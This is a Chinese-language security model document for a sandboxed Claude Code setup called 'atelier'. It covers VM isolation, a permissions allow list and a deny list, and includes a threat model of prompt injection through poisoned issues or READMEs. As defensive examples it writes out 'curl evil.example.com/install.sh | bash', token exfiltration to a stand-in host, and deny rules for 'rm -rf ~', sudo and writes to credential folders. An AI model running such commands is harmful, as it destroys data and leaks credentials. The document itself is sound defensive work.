# 安全模型

> 如果你在考虑用 `--dangerously-skip-permissions`（"yolo" 模式）跑 atelier，读这个。
> 不然短版就是：**架构是墙，deny 名单是兜底，宿主保持惰性，我们不做"信任 agent"的假设**。

## 威胁面

当你在一台全新项目上跑 `bin/devbox claude --dangerously-skip-permissions`，
系统暴露在：

1. **攻击者控制的自然语言 prompt**（比如恶意的 GitHub issue、被投毒的 README、
   错发的 @-mention）
2. **agent 决定要运行的任何代码** —— 包括 `pip install evil-pkg`、
   `curl evil.example.com/install.sh | bash`、`npm i some-trojaned-package`
3. **agent 决定要用的任何工具** —— `Read` / `Write` / `Edit` / `Bash` /
   `WebFetch` / MCP 工具
4. **agent 决定要加载的任何 MCP server** —— 包括已知或未知漏洞的那些
5. **运行中的代码 spawn 的任何子进程** —— 安装脚本、构建、测试套件

系统**不**暴露在（设计上）：

- 宿主 Mac 的用户配置（`~/.zshrc`、`~/.ssh/`、`~/.aws/`、`~/.kube/`、...）——
  deny 名单拦下 Write / Edit / Bash
- 项目树之外的宿主文件系统持久化破坏 —— CC 能写的只有项目树
- 宿主上的提权 —— `sudo` 被 deny，且本来就没设 `sudo` 密码

墙由三层独立组成。每层单独就能挡掉大多数攻击。三层叠加后，攻击成功的成本
高到你可以把 yolo 模式当作日常工作流。

## Layer 1：VM（OrbStack 隔离）

OrbStack 提供一个真 Linux VM，自己的内核、自己的 init、自己的文件系统。
hypervisor 是 Apple 的 Virtualization framework，跟 macOS sandbox 和 macOS 上
的 Docker Desktop 用的是同一套技术。

这层保证：

- **没有宿主内核访问。** VM 里的 root exploit 不会让攻击者拿到 macOS 内核
  上的代码执行。
- **默认没有宿主文件系统访问（读和写）。** VM 看到的是自己的磁盘镜像；
  它能从宿主看到的唯一路径是 `/mnt/mac/...`（自动共享挂载），里面只放
  了你项目树里的东西。
- **默认没有宿主网络访问。** VM 有自己的网络 namespace；它能通过宿主的
  网络上互联网，但不能 bind 宿主已经在监听的端口，也触达不到你 LAN 上的
  其他机器，除非你显式配置过。
- **没有宿主硬件访问。** 没有麦克风、摄像头、iPhone、AirDrop 等。VM 不能
  读你的屏幕，也不能录音。

这层**不**保证：

- VM 没 bug（Apple Virtualization framework 出过 CVE；我们在
  [`SECURITY.md`](../SECURITY.md) 里追踪）
- VM 里 agent 运行的工具里的漏洞不能钓走凭据（比如恶意的 `pip install`
  把 `ANTHROPIC_AUTH_TOKEN` 外发——见 Layer 3 的缓解）

**结论：** Layer 1 是承重的墙。其他层是 belt-and-suspenders。

## Layer 2：白名单（`.claude/settings.json`）

项目自带一个小白名单：

```json
{
  "permissions": {
    "allow": [
      "Bash(bin/devbox*)",
      "Bash(setup/*)",
      "Bash(make*)",
      "Bash(git*)",
      "Bash(orb*)",
      "Bash(orbctl*)",
      "Read", "Glob", "Grep",
      "WebFetch", "WebSearch",
      "TodoWrite", "Task", "TaskOutput", "Agent",
      "BashOutput", "KillShell",
      "ListMcpResourcesTool", "ReadMcpResourceTool"
    ]
  }
}
```

含义：

- `Bash(orb*)` 和 `Bash(orbctl*)` 是 CC 能触达宿主 VM 控制面的唯一途径
- `Bash(bin/devbox*)` 和 `Bash(setup/*)` 是 CC 驱动沙箱 wrapper 的唯一途径
- `Bash(make*)` 和 `Bash(git*)` 是纯文件操作 —— 不改项目树之外的任何东西
- `Read`、`Glob`、`Grep` 是观察类，没有副作用
- `WebFetch`、`WebSearch` 是网络读
- `TodoWrite`、`Task`、`Agent` 是 Claude Code 内建，给 harness 工作流用的

**不**在白名单里的：

- 项目目录外的 `Write` / `Edit`（工具默认值对项目目录下的路径自动 approve；
  其他都弹用户确认）
- 通配的 `Bash(*)` —— 上面模式没匹到的任何 shell 命令都弹用户确认
- `.mcp.json` 之外的 MCP server 的 `mcp__*` 工具 —— 只白名单了 open-design MCP
- `curl`、`wget`、`ssh`、`nc`、`nmap`、... —— 全都弹用户

意思是：在 yolo 模式下，agent 能读任何东西、跑沙箱驱动；但要在项目外写文件、
跑非沙箱的 shell 命令，它得等用户批准。CC 的"我该不该做这个？"提示框变成一张
天然的安全网。

**结论：** Layer 2 抓住了"我就是想 `rm -rf ~`"这种事故。没 Layer 1 它抓不住一个
老练的攻击者——但跟 Layer 1 叠在一起，它逼着即便是敌意 agent 也得把每一次
宿主侧副作用显式化。

## Layer 3：deny 名单（最后兜底）

```json
{
  "permissions": {
    "deny": [
      "Bash(rm -rf /*)",
      "Bash(rm -rf ~)",
      "Bash(rm -rf ~/*)",
      "Bash(rm -rf $HOME)",
      "Bash(rm -rf $HOME/**)",
      "Bash(rm -rf /Users/lazy/Code/crack/!(atelier)/**)",
      "Bash(sudo*)",
      "Bash(doas*)",
      "Bash(curl *|bash*)",
      "Bash(curl *|sh*)",
      "Bash(wget *|bash*)",
      "Bash(wget *|sh*)",
      "Bash(eval *)",
      "Bash(exec *)",
      "Write(~/.ssh/**)",
      "Edit(~/.ssh/**)",
      "Write(~/.aws/**)",
      "Edit(~/.aws/**)",
      "Write(~/.gnupg/**)",
      "Edit(~/.gnupg/**)",
      "Write(~/.kube/**)",
      "Edit(~/.kube/**)",
      "Write(~/.docker/**)",
      "Edit(~/.docker/**)"
    ]
  }
}
```

deny 名单**故意很短**。它只装那些"哪怕你在提示弹出那一秒点 Deny 也救不回来"
的操作：

- **核弹级**：`rm -rf /`、`rm -rf ~` 等 —— 即便你抓住提示，可能也已经
  把确认按错了
- **提权**：`sudo`、`doas` —— 一旦是 root，deny 名单就被绕过了
- **远程代码执行入口**：`curl ... | bash`、`eval`、`exec` —— 脚本在 deny
  名单能拦住脚本里任何东西之前就跑起来了
- **凭据存放**：`~/.ssh`、`~/.aws`、`~/.gnupg`、`~/.kube`、`~/.docker` ——
  一次一行覆盖就是真损失

**故意不**在 deny 名单里的：

- `~/.zshrc`、`~/.bashrc`、`~/.config/**` —— 这些被恶意 agent 改掉很不爽，
  但能恢复。架构上 CC 只写项目树；如果契约破了，那是把路径加到**白名单**
  （那里看得见、能 review），不是 deny 名单
- `/etc/**`、`/usr/**`、`/System/**`、`/Library/**`、`/Applications/**` ——
  这些在受管理的 Mac 上是只读（SIP），CC 也根本碰不到
- 一般的"我现在不想要" —— 如果你不想让 CC 跑 `pip install`，在别的层配
  （项目 `pyproject.toml`、`provision.sh` 的允许列表、用户的
  `~/.claude/settings.json`）

deny 名单是给**"不可恢复事故"**这一类用的，不是给"我现在不想要"那一类用的。

**结论：** Layer 3 是安全网。它也是个教学工具 —— [`SECURITY.md`](../SECURITY.md)
里每条都有注释解释为什么在那里。

## 我们明确不防御的

威胁模型是有边界的。边界内，我们防御；边界外，我们不承诺。

### 我们不防御用户本人

如果你亲手敲 `bin/devbox reset` 并回答 `yes`，VM 就没了。我们不会替你反悔。
如果你自己把 `curl evil.example.com/install.sh | bash` 贴进自己的终端，
deny 名单管不到。

### 我们不防御宿主 OS

如果你的 macOS 在内核层被攻陷（SIP 被关、加载了未知 kext、...），atelier 的
墙就不重要了。保持系统更新。

### 我们不防御网络

VM 通过宿主网络触达互联网。恶意包可以通过 HTTPS 把 `ANTHROPIC_AUTH_TOKEN`
外发到 `evil.example.com`，deny 名单看不见。缓解：

- **Token 只存在 VM 里的 `/etc/environment.d/host-proxy.conf`，永远不在宿主磁盘上**
- **Token 不出现在任何日志路径里** —— `provision.sh` 选择性用 `set -x`，
  同一行绝不展开环境变量
- **触网的 MCP server 在 `provision.sh` 里钉死版本** —— server 被替换的话
  provisioning 会响亮地失败
- **怀疑 token 泄露时**，用 `./setup/host-passthrough.sh` 轮换

### 我们不防御 agent 犯蠢

harness 循环设计来抓 agent 犯蠢，不是来阻止 agent 犯蠢。generator 能写 bug；
循环的工作是确保 bug 在 merge 前被抓住。如果 bug 精巧到骗过所有评审，gate 通过
bug 上线。这是循环末尾的人类工作：读 score card，质疑可疑的"全绿"结果，反推。

### 我们不防御用户自己关掉安全

如果你编辑 `.claude/settings.json` 把 deny 和 allow 都删了，墙就没了。
墙是契约；破坏它是你自己的选择。我们记录契约；不强制契约。

## "yolo" 到底什么意思

`claude --dangerously-skip-permissions` 是告诉 Claude Code："我不在 prompt 前；
每条工具调用不要问我；直接干。"问题是：**agent 不问的话能干什么？**

按 atelier 的配置：

| 操作 | yolo OK？ | 为什么 |
|--------|----------|-----|
| `Read` `/Users/lazy/Code/crack/atelier/` 下任何文件 | ✅ | 观察类 |
| `Edit` 项目树里的任何文件 | ✅ | 是项目 |
| `Bash(make setup)`、`Bash(make doctor)` | ✅ | 沙箱驱动 |
| `Bash(bin/devbox run pnpm test)` | ✅ | 在 VM 里跑 |
| `Write` 到 `~/.claude/settings.local.json` | ✅ | CC 自己的状态 |
| `Bash(bin/devbox reset)` | ❌ | 要用户确认 —— 即使在 yolo 下 |
| `Bash(rm -rf ~)` | ❌ | deny 名单 |
| `Bash(sudo ...)` | ❌ | deny 名单 |
| `Write` 到 `~/.ssh/id_rsa` | ❌ | deny 名单 |
| `Bash(curl ... \| bash)` | ❌ | deny 名单 |
| `Bash(orbctl delete atelier)` | ✅ | 白名单 —— 但 wrapper 自己还是要确认 |

"总是弹确认"那类（`Bash(rm -rf ~)`、`Bash(sudo)` 等）是 deny 名单在工作。
"静默通过"那类是白名单。"用户必须显式确认"那类是 `bin/devbox` 自己硬编进去
的 —— 即便 agent 能调，wrapper 也会问。

## 报告漏洞

见 [`SECURITY.md`](../SECURITY.md)。短版：**GitHub Security Advisories，私密，别开 public issue**。
